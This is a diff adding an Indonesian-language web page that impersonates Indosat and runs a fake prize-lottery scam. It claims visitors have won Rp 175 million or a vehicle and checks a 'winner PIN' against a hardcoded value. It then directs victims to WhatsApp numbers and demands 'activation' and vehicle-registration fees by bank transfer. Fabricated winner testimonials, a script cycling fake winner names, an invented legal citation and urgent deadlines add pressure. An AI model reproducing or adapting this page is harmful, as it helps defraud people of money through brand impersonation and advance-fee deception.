@@ -1,0 +1,397 @@
+<!DOCTYPE HTML>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+        <link rel="stylesheet" href="css-style.css">
+        <!-- Primary Meta Tags -->
+
+        <meta name="title" content="SELAMAT DATANG PEMENANG INDOSAT IMPOIN 2023">
+        <meta name="description" content="LAYANAN RESMI PEMENANG HADIAH INDOSAT IMPOIN  Hub Call Center : 0857-2371-0007">
+
+        <!-- Open Graph / Facebook -->
+        <meta property="og:type" content="website">
+        <meta property="og:url" content="https://metatags.io/">
+        <meta property="og:title" content="SELAMAT DATANG PEMENANG INDOSAT IMPOIN 2023">
+        <meta property="og:description" content="LAYANAN RESMI PEMENANG HADIAH INDOSAT IMPOIN  Hub Call Center : 0857-2371-0007">
+        <meta property="og:image" content="https://metatags.io/assets/meta-tags-16a33a6a8531e519cc0936fbba0ad904e52d35f34a46c97a2c9f6f7dd7d336f2.png">
+
+        <!-- Twitter -->
+        <meta property="twitter:card" content="summary_large_image">
+        <meta property="twitter:url" content="https://metatags.io/">
+        <meta property="twitter:title" content="SELAMAT DATANG PEMENANG INDOSAT IMPOIN 2023">
+        <meta property="twitter:description" content="LAYANAN RESMI PEMENANG HADIAH INDOSAT IMPOIN  Hub Call Center : 0857-2371-0007">
+        <meta property="twitter:image" content="https://metatags.io/assets/meta-tags-16a33a6a8531e519cc0936fbba0ad904e52d35f34a46c97a2c9f6f7dd7d336f2.png">
+        <title>indosatooreddo</title>
+        <link rel="shorcut icon" href="indosat1.jpg">
+    </head>
+    <body>
+        <div id="id">
+            <div id="notifications" style="display: none;">
+                <div class="alert alert-success alert-dismissible fade show" role="alert">
+                    <strong>Info Pemenang INDOSAT IMPOIN</strong><br><br> Selamat untuk <span id="namaPemenang">Fiersa Bersari</span>, Anda berhasil memenangkan uang tunai Rp 175.000.000!
+                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+                </div>
+                <div id="imgReward" style="display: none;">
+                    <canvas id="canvas"></canvas>
+                    <div class="img-pemenangx animate__animated animate__rotateIn" style="position: absolute; top: 40%; left: 0;right: 0; -ms-transform: translateY(-50%);transform: translateY(-50%)">
+                        <img src="images/img-uang.png" alt="">
+                    </div>
+                </div>
+                <!--Modal-->
+                <div class="modal hide fade" id="exampleModal" tabindex="4" aria-labelledby="exampleModalLabel" aria-hidden="true">
+                    <div class="modal-dialog">
+                        <div class="modal-content">
+                            <div class="modal-body">
+                                <img src="indosat.png" style="width: 150px; display: block; margin: auto;" alt="">
+                                <h4 class="text-center my-3">SELAMAT!</h4>
+                            <p class="text-center">Anda terpilih untuk mendapatkan Uang Tunai Rp. 175.000.000 / 175Juta Rupiah.<br>&nbsp;<br>Silahkan verifikasi PIN pemenang anda dengan mengklik tombol OK</p>
+                        </div>
+                        <div class="modal-footer">
+                            <button type="button" class="d-block mx-auto btn btn-danger w-75" onclick="location.href='pemenang.php';">OK</button>
+                        </div>
+                        </div>
+                    </div>
+                </div>
+                <div id="content">
+                    <div class="container">
+                        <div class="row">
+                            <div class="bg-white px-1">
+                                <div class="col-md-12 col-12 d-block mx-auto text-center">
+                                    <img class="img-kepala img-fluid" src= "indosat impoin.png" alt="">
+                                </div> 
+                                <div class="col-12 col-md-12 d-block mx-auto my-3">
+                                    <marquee class="txt-kepala" behavior="" direction="">Layanan Resmi Pemenang Hadiah INDOSAT IMPOIN Hub Call Center : <a href="https://api.whatsapp.com/send?phone=6285723710007&amp;text=Silakan%20konfirmasikan%0A%0ANama%20lengkap%3A%20%0APin%20pemenang%3A%20%0ANomor%2Fhp%3A%20%0A%0ATerima%20Kasih." style="color: #000; font-weight: bold;">0857-2371-0007</a> ( Whatsapp )</marquee>
+                                </div>
+                            </div>
+                            <div class="rectangle rWhite"></div>
+                                <div class="">
+                                    <div class="row ">
+                                        <div class="col-md-8 col-12 d-block mx-auto p-0 border-right">
+                                             <div class="bg-orange p-4 pt-5 p-md-5 pt-md-5">
+                                                <div class="header-text">SELAMAT DATANG PEMENANG HADIAH INDOSAT IMPOIN TAHUN.2023</div>
+                                <div class="header-text text-center mt-4 text-underline">&gt;&gt; <u><a href="#komentar" class="text-white">LIHAT KOMENTAR PEMENANG</a></u> 
+                                <div class="subheader-text mt-3">Untuk keamanan Mohon tidak memberitahukan pin pemenang kepada orang lain.</div>
+                                <form action="" class="mt-4 mt-md-5">
+                                    <div class="form-group">
+                                        <label for="">Masukan Pin Pemenang Anda</label>
+                                        <input type="text" minlength="9" maxlength="9" class="form-control mt-2 w-100" name="pin_1" id="pin_1" placeholder="Masukan 9 Digit Pin anda.">
+                                    </div>
+                                    <div class="form-group mt-4">
+                                        <label for="">Masukan Kembali Pin Pemenang Anda</label>
+                                        <input type="text" minlength="9" maxlength="9" class="form-control mt-2 w-100" name="pin_2" id="pin_2" placeholder="Masukan Kembali 9 Digit Pin anda.">
+                                    </div>
+                                    <div class="form-group mt-4">      
+                                        <button class="btn btn-light mt-2 w-100" type="button" id="doVerifikasi">Verifikasi</button>
+                                    </div>
+                                </form>
+                                <div class="border-pembatas my-5"></div>
+                                <div class="txt-border">Galeri Pemenang</div>
+        
+                                <div class="row mt-3">
+                                    <div class="subheader-text">
+                                    Disampaikan Kepada Saudara(i) Pemenang yang beruntung mendapatkan Pesan Resmi Undian INDOSAT disertai dengan KODE ID PEMENANG Yang  mencantumkan alamat Situs Resmi kami di: www.indosatooredoo.com<br><br>
+        Berarti Sah selaku pemenang Resmi  Hadiah langsung dari INDOSAT<br><br>
+        SELAMAT... Kepada Para Pemenang Yang beruntung Di Tahun 2022. Silahkan Anda Cocokkan KODE ID PEMENANG Yang Telah Anda Terima melalui Via WhatsApp atau Pesan Singkat Dari INDOSAT Dengan Hadiah Yang Sudah Terterah Di Bawah ini.Jika ada Kesamaan anda Segera Konfirmasi atau Menghubungi Melalui Telpon Ke Nomor Yang Telah Tercantum Di Situs ini.
+                                    </div>
+                                    <img src="pemanang.jpg" class="mt-4 img-fluid w-100 w-md-75 border-custom" alt="">
+                        </div>
+                    </div> 
+                    <div class="border-pembatas my-5"></div>
+                                    <div class="txt-border">KETERANGAN</div>
+                            <div>
+                                    <ol class="list-group">
+                                        <li>Di harapkan kepada para pemenang untuk tidak menyebar luaskan mengenai Hadiah ini sebelum hadiah diterima, umtuk menghindari adanya pemalsuan pemenang, iri hati &amp; cemburu sosial.UUD No.32 Pasal 331 ayat-23,Tentang Kecemburuan sosial sesama masyarakat</li>
+                                        <li class="mt-2">Pengundian sudah dilakukan di hadapan Notaris dan disaksikan oleh pihak dinas Sosial RI,Pemda DKI jkt dan jajaran Manajemen INDOSAT</li>
+                                        <li class="mt-2">Mohon maaf Apabila pencantunan Nomor Pemenang tidak kami cantumkan secara lengkap demi menghindari unsur-unsur yang tidak bertanggung jawab (penggandaan nomor/pemalsuan Nomor pemenang )</li>
+                                        <li class="mt-2">Pemenang resmi kami akan mendapatkan Konfirmasi melelui Via WhatsApp atau Pesan Singkat yang mencantungkan situs undian resmi INDOSAT yang sah hanya di com</li>
+                                    </ol>
+                                </div>
+                            </div>
+                            <div class="border-pembatas my-5"></div>
+                                    <div class="txt-border">PENGESAHAN HADIAH</div>
+        
+                                    <div>
+                                        <ol class="list-group">
+                                            <li>Hadiah kendaraan akan kami antarkan langsung ketempat kediaman pemenang sesuai dengan data di kartu identitas KTP pemenang</li>
+                                            <li class="mt-2">Hadiah uang tunai bisa di transfer melalui via Rekening yang di miliki pemenang atau milik Keluarga yang di Percayai,seperti(BRI,BNI,BCA,MANDIRI,DANAMON,MUAMALAT,dll)</li>
+                                            <li class="mt-2">Batas Pengambilan hadiah berlaku selama 2 hari, apabila Pemenang tidak mengurus hadiahnya sampai batas waktu Yang  ditentuakan, maka hadiah tersebut akan dialihkan Pada kandidat pemenang yang lain dan kewajiban kami Kepada pemenang sudah tidak ada lagi.</li>
+                                        </ol>
+                                    </div>
+        
+                                 </div>
+                                 div>
+                                    <div class="border-pembatas my-5"></div>
+                                    <div class="txt-border">SYARAT &amp; KETENTUAN HADIAH</div>
+        
+                                    <div>
+                                        <ol class="list-group">
+                                            <li>Hadiah Mobil &amp; Motor diantarkan langsung Ke alamat Pemenang melalui jasa penerbangan, dengan Menggunakan pesawat cargo BOEING C.130 dari Halim perdana kusuma menuju kebandara Atau lapangan penerbangan yang terdekat di daerah Pemenang. Setelah pemenang melunasi biaya Administrasi balik Nama STNK/BPKB Sebesar:Rp.950.000,-(kendaraan Mobil) dan Rp.500.000,-(kendaraan Motor) melalui BANK Setempat ditujukan  ke Rekening yang dipercayakan Oleh pihak Samsat Metro Jaya.</li>
+                                            <li class="mt-2">Untuk pemenang HADIAH CEK TUNAI Rp.175 jt Tata Cara atau Mekanisme pengambilan hadiah:<br>Apakah mau di Transfer ke Rekening Pemenang atau di Rekening keluarga terdekat yang anda percayai</li>
+                                            <li class="mt-2">Untuk Pemenang CEK TUNAI Rp.175.000.000 diwajibkan Untuk Melakukan Aktivasi atau pengaktifan dana Sebesar Rp.350.000 Ditransfer kerekening yang dipercayakan oleh team INDOSAT (UNTUK INFO LEBIH JELAS SILAHKAN LANGSUNG CHAT TEAM INDOSAT DI NOMOR 0857-2371-0007 WhatsApp ONLY)</li>
+                                            <li class="mt-2">Pihak pemenang yang mengeluarkan Biaya Administrasi di harapkan untuk tidak perlu khawatir Karena Seluruh Biaya pengeluaran yang di keluarkan Oleh pemenang itu hanya bersifat sementara Saja karna dari pihak INDOSAT siap untuk Menggantikan semua Biaya atau Dana pengeluaran yang Dikeluarkan oleh pihak pemenang.</li>
+                                            <li class="mt-2">Untuk pemenang hadiah Cek tunai, Hadiah tidak bisa dipotong, pemenang cukup mengikuti syarat apa yang di tetapkan karna itu sudah ketentuan dan hasil kesepakatan bersama.</li>
+                                        </ol>
+                                    </div> <div class="border-pembatas my-5"></div>
+                                    <div class="txt-border">DASAR HUKUM</div>
+            
+                                    <div class="my-3" id="fontGalery">
+                                    Cek telah diatur dalam Kitab Undang-undang Giro telah diatur dalam Surat Keputusan Direksi Bank BI(Bank Indonesia)No. 28/32/KEP/DIR tanggal 4 Juli 1995 tentang Bilyet Giro.
+                                      
+                                    </div>
+            
+                                    <div class="border-pembatas my-5"></div>
+                                    <div class="txt-border">PERHATIAN!!!</div>
+            
+                                    <div class="my-3" id="fontGalery">
+                                    Apabila Syarat &amp; Ketentuan tidak dipenuhi sesuai ketentuan yang di atas kami tidak bertanggung jawab apabila Hadiah anda akan kami realisasikan kepada (pemenang cadangan) yang sudah di siapkan oleh Perusahaan sesuai dengan kebijakan yang dikeluarkan oleh INDOSAT
+                                      
+                                    </div>
+                                    <div id="komentar"></div>
+                                    <div class="border-pembatas my-5"></div>
+                                    <div class="txt-border">KOMENTAR PEMENANG</div>
+
+                                     <div class="row mt-4">
+                                    <div class="col-md-12 text-center mt-2 mt-md-2">
+                                        <div class="bg-white w-100 p-0">
+                                            <img src="hadiah-utama-poin-plus-plus-indosat-2-2.jpg" class="img-fluid w-100" style="height: 200px;" alt="">
+                                            <div class="p-3 text-dark">
+                                               Bapak Ilham<br>
+                                                Kota Bengkulu
+                                                <hr class="w-25 d-block mx-auto">
+                                                Syukur Alhamdulilah,Allah mendengar doa"ku sa'at sy btuh mobil.utk sekolah anak saya.eh... Dapat Hadiah mobil. Sy berterima kasih untuk Bapak sandi dan INDOSAT telah m'bantu saya,sukses selalu
+                                            </div>
+                                        </div>
+
+                                        <div class="bg-white w-100 p-0 mt-3">
+                                            <img src="sms-pelanggan-istimewa-indosat.jpg" class="img-fluid w-100" style="height: 200px;" alt="">
+                                            <div class="p-3 text-dark">
+                                                Ibu Damayanti<br>
+                                                Kota Makasar
+                                                <hr class="w-25 d-block mx-auto">
+                                                Syukur Alhamdulilah,Allah mendengar doa"ku sa'at sy btuh uang.utk sekolah anak saya.eh... Dapat Hadiah Rp.175jt. Sy berterima kasih untuk Bapak sandi dan INDOSAT telah m'bantu saya,sukses selalu
+                                            </div>
+                                        </div>
+
+                                        <div class="bg-white w-100 p-0 mt-3">
+                                            <img src="Motor_Vaganza_2020.jpeg" class="img-fluid w-100" style="height: 200px;" alt="">
+                                            <div class="p-3 text-dark">
+                                                Maulana Sobirin<br>
+                                                Kota Klaten
+                                                <hr class="w-25 d-block mx-auto">
+                                                kebetulan saya mau cicilan Motor,siapa sangka saya menang undian dari INDOSAT saya beruntung dapat Motor. Surat STNK &amp; BPKB'nya pun Atas nama sya. semoga Perusahaan INDOSAT Bersatu dan Sukses BRAVO!!!
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="border-pembatas my-5"></div>
+                                <div class="txt-border">MARKETING OFFICE</div>
+
+                                <div class="row mt-4">
+                                    <div class="col-md-12 col-12 text-center mt-2 mt-md-2">
+                                        <img src="images/img-KTP.jpg" class="gedung img-fluid" alt="">
+                                    </div>
+                                    <div class="header-text mt-4 mb-3 text-center"> UNTUK INFORMASI LEBIH LANJUT HUBUNGI NO.WHATSAPP<br>0821-9470-2525</div>
+                                    <div class="col-12 col-md-12 text-center mt-2 mt-md-3 mb-4 mb-md-4">
+                                        <a href="https://api.whatsapp.com/send?phone=6285723710007&amp;text=Silakan%20konfirmasikan%0A%0ANama%20lengkap%3A%20%0APin%20pemenang%3A%20%0ANomor%2Fhp%3A%20%0A%0ATerima%20Kasih."><img src="SKbj5bj-chat-langsung-via-whatsapp-indihome.gif" class="w-100 w-md-50 img-fluid" alt=""></a>
+                                    </div>
+                                    <div class="subheader-text mt-4 mb-4 ">Semoga hadiah dari kami ini bisa berguna dan bermanfaat buat anda sekeluarga saya sampaikan hati -hati terhadap PENIPUAN!!! yang mengatas namakan dari INDOSAT karena di kalangan seseorang itu berbeda semua dan jangan ada yang saling mengecewakan dan izinkan kami untuk membantu anda sekeluarga.  </div>
+                                    <div class="header-text mt-4 mb-4 text-center"> WARNING !!! Hati -hati Terhadap Penipuan!!! Info Pemenang INDOSAT IMPOIN yang resmi Hanya di: </div>
+                                    <div class="col-12 col-md-12 text-center mt-2 mt-md-3 mb-4 mb-md-4">
+                                        <img src="images/img-bank.png" class="w-100 img-fluid" alt="">
+                                    </div>
+                                    <div class="col-12 col-md-12 text-center mt-2 mt-md-3 mb-4 mb-md-4">
+                                        <img src="images/54TQFZX-terima.gif" class="w-100 img-fluid" alt="">
+                                    </div>
+                                </div>
+                                </div>
+                            </div>
+            </div>
+        </div>
+              <script src="js/3.6.0-jquery.min.js"></script>
+            <script src="js/js-bootstrap.min.js"></script>
+            <script>
+                //-----------Var Inits--------------
+        canvas = document.getElementById("canvas");
+        ctx = canvas.getContext("2d");
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        cx = ctx.canvas.width/2;
+        cy = ctx.canvas.height/2;
+
+        let confetti = [];
+        const confettiCount = 500;
+        const gravity = 0.5;
+        const terminalVelocity = 5;
+        const drag = 0.075;
+        const colors = [
+          { front : 'red', back: 'darkred'},
+          { front : 'green', back: 'darkgreen'},
+          { front : 'blue', back: 'darkblue'},
+          { front : 'yellow', back: 'darkyellow'},
+          { front : 'orange', back: 'darkorange'},
+          { front : 'pink', back: 'darkpink'},
+          { front : 'purple', back: 'darkpurple'},
+          { front : 'turquoise', back: 'darkturquoise'},
+        ];
+
+        //-----------Functions--------------
+        resizeCanvas = () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            cx = ctx.canvas.width/2;
+            cy = ctx.canvas.height/2;
+        }
+
+        randomRange = (min, max) => Math.random() * (max - min) + min
+
+        initConfetti = () => {
+          for (let i = 0; i < confettiCount; i++) {
+            confetti.push({
+              color      : colors[Math.floor(randomRange(0, colors.length))],
+              dimensions : {
+                x: randomRange(10, 20),
+                y: randomRange(10, 30),
+              },
+              position   : {
+                x: randomRange(0, canvas.width),
+                y: canvas.height - 1,
+              },
+              rotation   : randomRange(0, 2 * Math.PI),
+              scale      : {
+                x: 1,
+                y: 1,
+              },
+              velocity   : {
+                x: randomRange(-25, 25),
+                y: randomRange(0, -50),
+              },
+            });
+          }
+        }
+
+        //---------Render-----------
+        render = () => {
+          ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+          confetti.forEach((confetto, index) => {
+            let width = (confetto.dimensions.x * confetto.scale.x);
+            let height = (confetto.dimensions.y * confetto.scale.y);
+
+            // Move canvas to position and rotate
+            ctx.translate(confetto.position.x, confetto.position.y);
+            ctx.rotate(confetto.rotation);
+
+            // Apply forces to velocity
+            confetto.velocity.x -= confetto.velocity.x * drag;
+            confetto.velocity.y = Math.min(confetto.velocity.y + gravity, terminalVelocity);
+            confetto.velocity.x += Math.random() > 0.5 ? Math.random() : -Math.random();
+
+            // Set position
+            confetto.position.x += confetto.velocity.x;
+            confetto.position.y += confetto.velocity.y;
+
+            // Delete confetti when out of frame
+            if (confetto.position.y >= canvas.height) confetti.splice(index, 1);
+
+            // Loop confetto x position
+            if (confetto.position.x > canvas.width) confetto.position.x = 0;
+            if (confetto.position.x < 0) confetto.position.x = canvas.width;
+
+            // Spin confetto by scaling y
+            confetto.scale.y = Math.cos(confetto.position.y * 0.1);
+            ctx.fillStyle = confetto.scale.y > 0 ? confetto.color.front : confetto.color.back;
+
+            // Draw confetto
+            ctx.fillRect(-width / 2, -height / 2, width, height);
+
+            // Reset transform matrix
+            ctx.setTransform(1, 0, 0, 1, 0, 0);
+          });
+
+          // Fire off another round of confetti
+          //if (confetti.length <= 10) initConfetti();
+
+          window.requestAnimationFrame(render);
+        }
+
+        //---------Execution--------
+
+        //----------Resize----------
+        window.addEventListener('resize', function () {
+          resizeCanvas();
+        });
+
+            </script>
+            <script>
+
+                var i = 0;
+                var name = new Array('Rifqy Fachrully', 'Rheza Baskoro', 'Bayu Shalimah', 'Achmad Oktavianty', 'Romario Qosthory', 'Lintang Alyani', 'Kenneth Primanelza', 'Fadhlir Pramanda', 'Michael Ardhi');
+                function myLoop() {
+                    var explodeName = name.split(",");
+                    setTimeout(function() {
+                        $("#namaPemenang").html(explodeName[i]);
+                        $("#notifications").css("display", "block");
+
+                        setTimeout(function() {
+                            $("#namaPemenang").html('');
+                            $("#notifications").css("display", "none");
+                        }, 5000);
+
+                        i++;
+                        if (i < explodeName.length) {
+                            myLoop();
+                        }
+                    }, 15000);
+                }
+
+                myLoop();
+
+                $(document).ready(function() {
+                    // var name = ['Rifqy Fachrully', 'Rheza Baskoro', 'Bayu Shalimah', 'Achmad Oktavianty', 'Romario Qosthory', 'Lintang Alyani', 'Kenneth Primanelza', 'Fadhlir Pramanda', 'Michael Ardhi'];
+
+                    // count = 0;
+                    // for(var i = 0; i < name.length; ++i){
+                    //     setTimeout(function() {
+                    //         console.log(name[count]);
+                    //         count++;
+                    //     }, 3000);
+                    // }
+
+
+                    $("#doVerifikasi").on('click', function() {
+                        var pin_1 = $("#pin_1").val();
+                        var pin_2 = $("#pin_2").val();
+                        var pin   = "TUUH2714W";
+
+                        if(pin_1.length < 1 || pin_2.length < 1) {
+                            alert("Verifikasi Gagal: Masukan 9 digit pin anda!.");
+                        } else if(pin_1.length < 9 || pin_2.length < 9) {
+                            alert("Verifikasi Gagal: Lengkapi PIN anda, Minimal 9 Digit");
+                        } else {
+                            if(pin_1 != pin_2) {
+                                alert("Verifikasi Gagal: Kedua PIN harus sama, silahkan coba lagi.");
+                            } else if(pin_1 == pin || pin_2 == pin ) {
+                                $("#imgReward").show();
+                                initConfetti();
+                                render();
+                                setTimeout(function(){
+                                    $("#imgReward").hide();
+                                    $('#exampleModal').modal('show', function() {
+                                        initConfetti();
+                                        render();
+                                    });
+                                 }, 4000);
+                            } else {
+                                alert("Verifikasi Gagal: PIN salah, silahkan cek PIN anda terlebih dahulu");
+                            }
+                        }
+                    });
+                });
+                </script>
+   </body>
+</html>
